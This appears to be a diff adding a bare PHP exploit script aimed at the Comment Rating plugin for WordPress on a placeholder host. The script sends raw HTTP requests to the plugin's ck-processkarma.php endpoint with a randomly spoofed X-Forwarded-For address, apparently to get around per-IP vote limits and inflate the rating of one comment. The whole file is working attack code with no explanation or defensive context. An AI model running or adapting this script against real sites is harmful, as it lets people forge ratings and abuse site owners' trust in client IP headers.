@@ -1,0 +1,21 @@
+<?PHP
+ 
+define('HOST','http://www.example.com/wordpress/');
+define('IDCOMMENT',2);
+$url=parse_url(HOST);
+define('URL',$url['path'].'wp-content/plugins/comment-rating/ck-processkarma.php?id='.IDCOMMENT.'&action=add&path=a&imgIndex=1_14_');
+for($i=0;$i<1;$i++) lvlup();
+ 
+function lvlup(){
+    global $url;
+    $header = "GET ".URL." HTTP/1.1 \r\n";
+    $header.= "Host: ".$url['host']."\r\n";
+    $header.= "Accept-Encoding: gzip, deflate \r\n";
+    $header.= "X-Forwarded-For: ".long2ip(rand(0, "4294967295"))."\r\n";
+    $header.= "Connection: close \r\n\r\n";
+    $socket  = socket_create(AF_INET, SOCK_STREAM,  SOL_TCP);
+    socket_connect($socket,$url['host'], 80);
+    socket_write($socket, $header);
+    socket_close($socket);
+}
+ 
